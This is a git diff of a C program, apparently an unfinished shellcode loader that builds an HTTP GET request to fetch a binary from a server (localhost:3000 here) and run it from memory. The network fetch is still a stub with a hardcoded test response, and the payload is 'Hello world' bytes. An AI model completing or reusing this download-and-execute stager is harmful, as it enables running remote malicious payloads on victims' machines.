@@ -5,6 +5,7 @@
 #include <errno.h>  // erno
 
 #define MAX_BUFFER 1024
+#define MAX_RESPONSE 8192
 
 /**
  * Execute the shellcode
@@ -52,7 +53,7 @@ int execute_shellcode(void* shellcode, size_t size) {
  * 					including the root (ex. /directry/directory2/file.bin)
  * @param host the host of the HTTP server (ex. https://<host>/)
  * @param port the port to send the HTTP request to
- * @return the size of the shellcode
+ * @return the size of the shellcode, or -1 on error.
  */
 size_t get_shellcode(void** shellcode,
 					 const char* path,
@@ -72,14 +73,30 @@ size_t get_shellcode(void** shellcode,
     "Hello wolrd!\r\n";     // OR       "\x48\x65\x6c\x6c\x6f\x2c\x20\x57"
                             //          "\x6f\x72\x6c\x64\x21\x0d\x0a"
 
-	char get_request[MAX_BUFFER] = "GET ";
-	strncat(get_request, path, MAX_BUFFER - 1);
-	strncat(get_request, " HTTP/1.1\r\nHost: ", MAX_BUFFER - 1);
-	strncat(get_request, host, MAX_BUFFER - 1);
-	strncat(get_request, "\r\n\r\n", MAX_BUFFER - 1);
-	printf("Headers: \n%s", get_request);
+	// construct get request
+	char http_request[MAX_BUFFER] = "GET ";
+	strncat(http_request, path, MAX_BUFFER - 1);
+	strncat(http_request, " HTTP/1.1\r\nHost: ", MAX_BUFFER - 1);
+	strncat(http_request, host, MAX_BUFFER - 1);
+	strncat(http_request, "\r\n\r\n", MAX_BUFFER - 1);
+	printf("Headers: \n%s\n", http_request);
 
-	
+	// response buffer
+	// char http_response[MAX_BUFFER];  // NOTE: maybe don't store it in a string, the binary data may contains null terminators
+	// memset(http_response, '\0', MAX_BUFFER);
+
+	char http_response[] = "Test\r\nContent-Length: 311\r\n\r\nblob";  // just for testing
+	// TODO: actually fetch the binary here
+
+	printf("Response: \n%s\n", http_response);
+
+	// search for Content-Length header
+	char* content_length_header = NULL;
+	char search_token[] = "Content-Length: ";
+	if ((content_length_header = strstr(http_response, search_token)) == NULL) return -1;
+	// if ((content_length_header = strtok(content_length_header, )) == NULL) return -1;
+
+	printf("CL Header: \n%s", content_length_header);
 
 	size_t size = sizeof(hello_code) - 1;  // content-length;
 	(*shellcode) = malloc(size);  // allocate memory to store shellcode
@@ -93,7 +110,11 @@ size_t get_shellcode(void** shellcode,
 
 int main(int argc, const char** argv) {
 	void* shellcode = NULL;
-	size_t shellcode_size = get_shellcode(&shellcode, "/test.bin", "localhost", 3000);
+	size_t shellcode_size = 0;
+	if ((shellcode_size = get_shellcode(&shellcode, "/test.bin", "localhost", 3000)) == -1) {
+		printf("Erorr getting shellcode.");
+		return -1;
+	}
 
 	// test to show shellcode:
 	// for (size_t i = 0; i < shellcode_size; i++) {
